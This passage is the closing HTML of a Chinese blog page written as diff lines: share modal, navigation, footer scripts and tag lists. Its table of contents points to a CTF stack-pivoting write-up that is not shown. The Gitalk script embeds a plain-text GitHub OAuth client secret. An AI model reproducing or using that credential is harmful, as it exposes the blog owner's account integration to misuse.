+     </div>
+</div>
+<div class="post-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:" id="wxShare-close">×</a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://www.hosiang.cn/16433f9b/" alt="微信分享二维码">
+</div>
+
+<div class="mask"></div>
+
+        
+        <ul class="article-footer-menu">
+            
+            
+  <li class="article-footer-tags">
+    <i class="fa fa-tags"></i>
+      
+    <a href="/tags/Popular/" class="color3">Popular</a>
+      
+  </li>
+
+        </ul>
+        
+    </footer>
+  </div>
+</article>
+
+
+    <aside class="post-toc-pos post-toc-top" id="post-toc">
+        <nav class="post-toc-wrap">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ASLR和PIE"><span class="post-toc-text">ASLR和PIE</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#stack-pivoting"><span class="post-toc-text">stack pivoting</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#X-CTF-2016-b0verfl0w"><span class="post-toc-text">X-CTF 2016 b0verfl0w</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析"><span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#思路分析"><span class="post-toc-text">思路分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#方法一"><span class="post-toc-text">方法一</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#方法二"><span class="post-toc-text">方法二</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#exp"><span class="post-toc-text">exp</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#exp一"><span class="post-toc-text">exp一</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#exp二"><span class="post-toc-text">exp二</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#frame-faking"><span class="post-toc-text">frame faking</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路一"><span class="post-toc-text">思路一</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#应用一"><span class="post-toc-text">应用一</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路二"><span class="post-toc-text">思路二</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#应用二"><span class="post-toc-text">应用二</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#实践"><span class="post-toc-text">实践</span></a></li></ol>
+        </nav>
+    </aside>
+    
+
+<nav id="article-nav">
+  
+    <a href="/1af481d2/" id="article-nav-newer" class="article-nav-link-wrap">
+
+      <span class="article-nav-title">
+        <i class="fa fa-hand-o-left" aria-hidden="true"></i>
+        
+          推荐系列-时序数据库Influx-IOx源码学习二（环境搭建）
+        
+      </span>
+    </a>
+  
+  
+    <a href="/2b69fda4/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-title">推荐系列-继续探究-一文理清JVM和GC（下）</span>
+      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
+    </a>
+  
+</nav>
+
+
+
+    
+        <div id="gitalk"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+      repo: 'bolg-comment',
+      owner: 'Hosiang1026',
+      admin: 'Hosiang1026',
+      clientID:  '37a2dd4473e8970cecc2',
+      clientSecret: 'e30efa17d86d9de4f4ab810872dc62a7b2e7e634',
+      pagerDirection: 'last',
+      distractionFreeMode: true,
+      createIssueManually: false
+    });
+gitalk.render('gitalk');
+</script>
+      
+</section>
+        
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <script id="_wau78w">var _wau = _wau || []; _wau.push(["small", "5dnguv4c2n", "78w"]);</script>
+      <script async src="//waust.at/s.js"></script>
+      <p>
+        <!-- Hosted by <a href="https://pages.coding.me" style="font-weight: bold" rel="external nofollow">Coding Pages</a> 
+        <a>Howe Hsiang</a>
+        <br>-->
+        
+    <span id="busuanzi_container_site_uv" style="display:none">
+     <span class="post-count">
+        总字数：<span>1241.2k</span>
+     </span>
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style="display:none">
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+  <br>
+
+
+         <span id="TimeShow">本站</span><span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+         <br>
+        Copyright&copy; 2018 - 2021 狂欢马克思
+        <a href="http://www.beian.miit.gov.cn" rel="external nofollow noopener noreferrer" target="_blank">
+          京ICP备17060439号</a>
+      </p>
+    </div>
+  </div>
+  <script>
+      var now = new Date();
+      function createtime() {
+          //此处修改你的建站时间或者网站上线时间
+          var grt= new Date("2017/09/18");
+          now.setTime(now.getTime()+250);
+          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+          document.getElementById("timeDate").innerHTML = "安全运行 "+dnum+" 天 ";
+          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+      }
+   setInterval("createtime()",800);
+  </script>
+</footer>
+
+    <!--<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>-->
+
+<script>
+  var mihoConfig = {
+      root: "https://www.hosiang.cn",
+      animate: "true",
+      isHome: "false",
+      share: "true",
+      reward:" 1"
+  }
+</script>
+<div class="sidebar">
+    <div id="sidebar-search" title="Search">
+        <i class="fa fa-search"></i>
+    </div>
+    <div id="sidebar-category" title="Categories">
+        <i class="fa fa-book"></i>
+    </div>
+    <div id="sidebar-tag" title="Tags">
+        <i class="fa fa-tags"></i>
+    </div>
+    <div id="sidebar-top">
+        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
+    </div>
+</div>
+<div class="sidebar-menu-box" id="sidebar-menu-box">
+    <div class="sidebar-menu-box-container">
+        <div id="sidebar-menu-box-categories">
+            <a class="category-link" href="/categories/兴趣爱好/">兴趣爱好</a><a class="category-link" href="/categories/其他开发/">其他开发</a><a class="category-link" href="/categories/前沿开发/">前沿开发</a><a class="category-link" href="/categories/前端开发/">前端开发</a><a class="category-link" href="/categories/升级版本/">升级版本</a><a class="category-link" href="/categories/博客教程/">博客教程</a><a class="category-link" href="/categories/后端开发/">后端开发</a><a class="category-link" href="/categories/操作系统/">操作系统</a><a class="category-link" href="/categories/日常记录/">日常记录</a><a class="category-link" href="/categories/热门文章/">热门文章</a>
+        </div>
+        <div id="sidebar-menu-box-tags">
+            <a href="/tags/Ajax/" style="font-size: 10px;">Ajax</a> <a href="/tags/AliGenie/" style="font-size: 10px;">AliGenie</a> <a href="/tags/Alipay/" style="font-size: 10px;">Alipay</a> <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 17.5px;">Blockchain</a> <a href="/tags/CQRS/" style="font-size: 10px;">CQRS</a> <a href="/tags/Database/" style="font-size: 15px;">Database</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/EasyUI/" style="font-size: 10px;">EasyUI</a> <a href="/tags/Guitar/" style="font-size: 10px;">Guitar</a> <a href="/tags/Hackintosh/" style="font-size: 12.5px;">Hackintosh</a> <a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/IntelliJ-IDEA/" style="font-size: 10px;">IntelliJ IDEA</a> <a href="/tags/Java/" style="font-size: 12.5px;">Java</a> <a href="/tags/Kali-Linux/" style="font-size: 10px;">Kali Linux</a> <a href="/tags/Life/" style="font-size: 17.5px;">Life</a> <a href="/tags/Mac-OS/" style="font-size: 12.5px;">Mac OS</a> <a href="/tags/MultiThread/" style="font-size: 10px;">MultiThread</a> <a href="/tags/NodeJS/" style="font-size: 10px;">NodeJS</a> <a href="/tags/Popular/" style="font-size: 20px;">Popular</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/SaaS/" style="font-size: 10px;">SaaS</a> <a href="/tags/Servlet/" style="font-size: 10px;">Servlet</a> <a href="/tags/Spring/" style="font-size: 17.5px;">Spring</a> <a href="/tags/Upgrade/" style="font-size: 10px;">Upgrade</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/Work/" style="font-size: 10px;">Work</a> <a href="/tags/iOS/" style="font-size: 10px;">iOS</a>
+        </div>
+    </div>
+    <a href="javascript:" class="sidebar-menu-box-close">&times;</a>
+</div>
+<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
+    <div class="mobile-header-menu-container">
+        <span class="title">导航</span>
+        <ul class="mobile-header-menu-navbar">
+            
+            <li>
+                <a href="/">
+                    <i class="fa fa-home"></i><span>主页</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/archives">
+                    <i class="fa fa-archive"></i><span>归档</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/gitbook">
+                    <i class="fa fa-columns"></i><span>笔记</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/music?id=91451362">
+                    <i class="fa fa-music"></i><span>音乐</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/photo">
+                    <i class="fa fa-picture-o"></i><span>相册</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/love">
+                    <i class="fa fa-heart"></i><span>恋爱</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/collection">
+                    <i class="fa fa-envira"></i><span>收藏</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/about">
+                    <i class="fa fa-user"></i><span>关于</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="mobile-header-tag-container">
+        <span class="title">标签</span>
+        <div id="mobile-header-container-tags">
+            <a href="/tags/Ajax/" style="font-size: 10px;">Ajax</a> <a href="/tags/AliGenie/" style="font-size: 10px;">AliGenie</a> <a href="/tags/Alipay/" style="font-size: 10px;">Alipay</a> <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 17.5px;">Blockchain</a> <a href="/tags/CQRS/" style="font-size: 10px;">CQRS</a> <a href="/tags/Database/" style="font-size: 15px;">Database</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/EasyUI/" style="font-size: 10px;">EasyUI</a> <a href="/tags/Guitar/" style="font-size: 10px;">Guitar</a> <a href="/tags/Hackintosh/" style="font-size: 12.5px;">Hackintosh</a> <a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/IntelliJ-IDEA/" style="font-size: 10px;">IntelliJ IDEA</a> <a href="/tags/Java/" style="font-size: 12.5px;">Java</a> <a href="/tags/Kali-Linux/" style="font-size: 10px;">Kali Linux</a> <a href="/tags/Life/" style="font-size: 17.5px;">Life</a> <a href="/tags/Mac-OS/" style="font-size: 12.5px;">Mac OS</a> <a href="/tags/MultiThread/" style="font-size: 10px;">MultiThread</a> <a href="/tags/NodeJS/" style="font-size: 10px;">NodeJS</a> <a href="/tags/Popular/" style="font-size: 20px;">Popular</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/SaaS/" style="font-size: 10px;">SaaS</a> <a href="/tags/Servlet/" style="font-size: 10px;">Servlet</a> <a href="/tags/Spring/" style="font-size: 17.5px;">Spring</a> <a href="/tags/Upgrade/" style="font-size: 10px;">Upgrade</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/Work/" style="font-size: 10px;">Work</a> <a href="/tags/iOS/" style="font-size: 10px;">iOS</a>
+        </div>
+    </div>
+</div>
+<div class="search-wrap">
+    <span class="search-close">&times;</span>
+        <a href="javascript:" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <i class="icon icon-lg icon-chevron-left"></i>
+        </a>
+        <input class="search-field" placeholder="Search..." id="keywords">
+        <a id="search-submit" href="javascript:">
+            <i class="fa fa-search"></i>
+        </a>
+    <div class="search-container" id="search-container">
+        <ul class="search-result" id="search-result">
+        </ul>
+    </div>
+</div>
+
+<div id="search-tpl">
+    <li class="search-result-item">
+        <a href="{url}" class="search-item-li">
+            <span class="search-item-li-title" title="{title}">{title}</span>
+        </a>
+    </li>
+</div>
+<script src="/js/search.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
+  <div id="particles"></div>
+  <script src="/js/particles.js"></script>
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
+  <script src="/js/animate.js"></script>
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+
